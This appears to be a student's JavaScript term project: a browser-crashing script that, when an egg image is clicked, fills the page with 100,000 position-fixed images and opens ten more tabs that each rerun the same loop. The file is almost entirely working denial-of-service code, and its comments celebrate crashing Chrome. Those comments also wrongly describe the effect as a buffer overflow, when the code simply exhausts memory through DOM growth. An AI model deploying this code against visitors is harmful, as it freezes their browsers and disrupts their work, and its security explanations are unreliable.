
// Bri D'Urso -- 10-27-22 -- CS280 Term Project
//
// This script is designed to crash the browser via exploitation
// of a particular property of a CSS property (position: fixed)
//
// This script is designed to exploit a property of CSS
// which apparently makes an element be stored in browser
// memory without regarding the memory limits, (I think).
// Basically, it has to  do with the 'position: fixed;'
// attribute in CSS, and the plan is to overflow the browser's
// buffer with a bunch of elements with fixed positions.

// Apparently, the 'position: fixed;' CSS property
// holds the element in question in memory in a way
// not too dissimilar to malloc() in C, which seems to be
// why it is able to crash the browser.
// Nice!!


// Currently seems to work!!
// Upon clicking the picture of the egg, the tab crashes!
// That's a great sign!
// Prior to clicking the egg, there is no issue.
// However, clicking the egg starts the script, and crashes the browser!
// (or, the tab/page, at the very least.)
// The tab/page becomes entirely unresponsive, even when attempting to refresh the page!

// IT CRASHES CHROME!! NICE!!!

// Checked resource monitor, confirmed buffer overflow!

// Started testing with a few different versions (sizes) of the
// Stephan's Quintet photo from the James Webb Space Telescope,
// it appears larger images cause the ram to leak much quicker (which makes sense)
// so I figured I'd add some larger images for testing purposes

window.onload = () => {

    // variable to control the intensity of the exploit
    // (aka, the requested amount of egg B) )
    let amount = 100000;

    // payload to overflow the buffer with
    let payloadStyles = `position: fixed;`;
    let payload = `<img src="img/stephans-quintet-jwst_large.jpeg" alt="eg" style="${payloadStyles}">`;

    // make way too many fixed elements
    // not totally sure of an overflow at this point, however that would be ideal
    // it seems functionally similar, at the very least
    let fixedOverflow = (amt) => {
        for (let i = 0; i < amt; i++) {
            // using setTimeout here so the page doesn't immediately crash
            // this allows the memory to fill up more before the process ends (crashes)
            setTimeout(document.getElementById(`egg`).innerHTML += payload, 8);
        }
    };

    // used to open several tabs during the process so that when one tab crashes,
    // another is opened to further continue the ram "leak"
    let openTabs = (numTabs) => {
        for (let i = 0; i < numTabs; i++) {
            setTimeout(window.open(`${window.location.href}`,`egg`,`inner-width: 193`), 10);
        }
    };

    // for use with openTabs
    // if it has a certain property (used to identify tabs opened with openTabs),
    // auto run the exploit loop
    let autoRun = () => {
        if (window.innerWidth === 193) {
            fixedOverflow(amount);
        }
    };

    // run the "fixedOverflow" function when the egg is clicked
    document.getElementById(`egg`).addEventListener(`click`, () => {
        openTabs(10);   // open more tabs to run the process
        fixedOverflow(amount);  // "overflow"
        console.log(`mission is a go... hopefully, lol`);
    });

    // if certain conditions are met, automatically run the exploit after 1 sec of the tab being open
    setTimeout(autoRun(), 1000);

};
